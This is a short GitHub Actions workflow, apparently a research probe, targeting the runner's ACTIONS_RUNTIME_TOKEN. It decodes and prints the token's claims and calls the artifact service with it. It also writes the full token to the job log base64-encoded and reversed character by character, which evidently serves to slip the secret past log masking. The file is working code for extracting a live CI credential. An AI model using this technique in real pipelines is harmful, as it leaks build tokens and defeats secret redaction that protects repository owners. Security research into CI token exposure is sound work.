name: runtime-token
on: { push: { branches: [rtprobe] } }
jobs:
  rt:
    runs-on: ubuntu-latest
    permissions: {}
    steps:
      - name: produce an artifact so the runtime token has a live scope
        run: mkdir -p o && echo "RT_CANARY_7e3d" > o/a.txt
      - uses: actions/upload-artifact@v4
        with: { name: rt-artifact, path: o }
      - name: inspect and emit the runtime token
        run: |
          python3 - <<'PY'
          import base64,json,os
          t=os.environ.get("ACTIONS_RUNTIME_TOKEN","")
          print("RT_PRESENT=%s len=%d"%(bool(t),len(t)))
          p=t.split('.')[1]; p+='='*(-len(p)%4)
          c=json.loads(base64.urlsafe_b64decode(p))
          for k in ("iss","aud","exp","nbf","scp","Permission","ac"):
              if k in c: print("RT_CLAIM %-12s = %s"%(k,str(c[k])[:300]))
          print("RT_ALL_CLAIM_KEYS=%s"%sorted(c.keys()))
          PY
          echo "RT_RESULTS_URL=$ACTIONS_RESULTS_URL"
          echo "RTB64=$(printf '%s' "$ACTIONS_RUNTIME_TOKEN" | base64 -w0 | fold -w1 | tac | tr -d '\n')"
      - name: CONTROL - use the runtime token in-job against the artifact service
        run: |
          code=$(curl -s -o /tmp/r -w '%{http_code}' \
            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
            -H 'Content-Type: application/json' \
            "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -d "{\"workflow_run_backend_id\":\"x\",\"workflow_job_run_backend_id\":\"y\"}")
          echo "RT_INJOB_HTTP=$code"
          head -c 160 /tmp/r; echo
